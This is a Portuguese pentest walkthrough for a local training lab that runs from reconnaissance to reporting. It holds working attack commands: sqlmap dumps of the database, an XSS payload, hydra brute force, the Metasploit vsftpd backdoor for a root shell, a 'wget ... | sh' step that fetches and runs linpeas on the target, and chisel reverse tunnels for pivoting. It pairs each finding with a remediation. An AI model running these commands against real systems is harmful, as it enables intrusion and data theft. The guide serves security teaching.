# 🎯 Walkthrough Guiado — do Recon ao Relatório

> Um **pentest completo passo a passo** contra o [laboratório](../lab/) deste repo.
> Você vai usar as três ferramentas + o arsenal, na ordem da metodologia, e
> aprender a **interpretar** cada resultado e **como corrigir**.

> ⚠️ Só contra o **seu lab** ou alvos autorizados. As portas/IPs abaixo são do lab local.

---

## 0. Preparação

```bash
# Instala o arsenal (uma vez)
./tools/setup-arsenal.sh -y

# Sobe os alvos
cd lab && docker compose --profile net up -d && cd ..
docker compose -f lab/docker-compose.yml ps     # confere portas
```

Você terá: Juice Shop (`:3000`), DVWA (`:8080`), bWAPP (`:8081`), Metasploitable (`:2121/2222/8023/4445`).

---

# PARTE A — Aplicação Web (Juice Shop / DVWA)

## A1. Recon / Fingerprint
**Objetivo:** saber o que é o alvo antes de tocar fundo.

```bash
./tools/web-recon.sh http://127.0.0.1:3000 -y -o recon-juice
```
**O que observar:**
- `nmap`/headers → servidor, tecnologia (Juice Shop = Node/Express).
- `nikto`/`nuclei` → headers de segurança ausentes (CSP, X-Frame-Options).
- Resultado salvo em `recon-juice/`.

> 🧠 **Aprendeu:** fingerprinting orienta os próximos passos — você ataca o que
> existe, não no escuro.

## A2. Enumeração de conteúdo
**Objetivo:** achar rotas/arquivos escondidos.

```bash
# diretórios e arquivos
feroxbuster -u http://127.0.0.1:3000 -w /opt/arsenal/SecLists/Discovery/Web-Content/common.txt
# ou
ffuf -u http://127.0.0.1:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
```
**O que observar:** `/ftp`, `/administration`, `/rest/...` no Juice Shop, `/robots.txt`.

## A3. Vulnerabilidades de aplicação
**Objetivo:** explorar falhas reais (em ambiente seu!).

**SQL Injection (DVWA, nível Low):**
```bash
# DVWA: login admin/password, SQL Injection -> capture o cookie PHPSESSID
sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=XXXX; security=low" --batch --dump
```
→ extrai usuários/hashes do banco. **Aprendeu:** entrada não parametrizada vira RCE no banco. **Corrige:** prepared statements.

**XSS (Juice Shop):** no campo de busca, teste `<iframe src="javascript:alert('xss')">`.
→ **Corrige:** encoding de saída + Content-Security-Policy.

**Login brute (DVWA):**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```
→ **Corrige:** rate-limiting, lockout, MFA, senhas fortes.

## A4. Scanner automatizado de templates
```bash
nuclei -u http://127.0.0.1:3000 -exclude-tags dos,intrusive,fuzz -o juice-nuclei.txt
```
→ exposições e CVEs conhecidas, com severidade.

---

# PARTE B — Host de Rede (Metasploitable 2)

> Para fidelidade total, rode o **Metasploitable como VM** numa rede host-only e
> use o IP dela (as portas do container são remapeadas). Abaixo, `MSF_IP` = IP da VM.

## B1. hackerEnv (automatizado)
```bash
./hackerEnv -t MSF_IP -a SEU_IP -oA
```
**O que acontece (fluxo do [guia](GUIA-EDUCATIVO.md)):**
1. Sweep + confirma host online.
2. `nmap -sV -A -O` → acha FTP vsftpd 2.3.4, OpenSSH, Samba, etc.
3. Casa versões → dispara exploits (vsftpd backdoor, usermap_script…).
4. Gera `report.html`/`.docx` + pastas por host com os artefatos.

## B2. Exploração manual (entender o que o tool automatiza)
```bash
searchsploit vsftpd 2.3.4              # acha o exploit
msfconsole -q
  use exploit/unix/ftp/vsftpd_234_backdoor
  set RHOSTS MSF_IP
  run                                  # -> shell de root
```
**Aprendeu:** o hackerEnv só orquestra isto. Ler o `.rc` gerado mostra exatamente o módulo/params.

## B3. Pós-exploração (com o shell em mãos)
```bash
# no alvo: enumeração de privesc
wget http://SEU_IP/linpeas.sh -O- | sh
# pivoting para a rede interna a partir do alvo
chisel server -p 8080 --reverse          # no seu host
chisel client SEU_IP:8080 R:1080:socks   # no alvo
proxychains4 nmap -sT 10.0.0.0/24        # escaneia o que só o alvo enxerga
```

---

## C. Relatório & ciclo defensivo

- O `hackerEnv` já gera **HTML/DOCX** com *Descrição / Remediação / Referências*.
- Para web, consolide as saídas (`recon-juice/`, `*-nuclei.txt`, dumps do sqlmap).
- **Para cada achado, escreva a correção** — é o que fecha o ciclo:

| Achado | Correção |
|---|---|
| SQLi | prepared statements / ORM, validação de entrada |
| XSS | output encoding + CSP |
| Senha fraca / brute | MFA, lockout, política de senha |
| Serviço desatualizado (vsftpd, Samba) | patch / upgrade, remover serviço não usado |
| Headers ausentes | HSTS, CSP, X-Frame-Options, X-Content-Type-Options |
| Porta/serviço exposto | firewall, segmentação de rede |

---

## Resumo da metodologia

```
Recon → Enumeração → Exploração → Pós-exploração → Relatório → Correção → (re-teste)
  │          │            │              │              │
web-recon  ffuf/      sqlmap/msf/    linpeas/       hackerEnv
  nmap     nuclei      hydra          chisel         (auto)
```

Pratique cada fase no lab até virar reflexo. Depois, leve para **CTFs** (HackTheBox,
TryHackMe) e, com autorização, para auditorias reais. **Sempre** com permissão. 🛡️
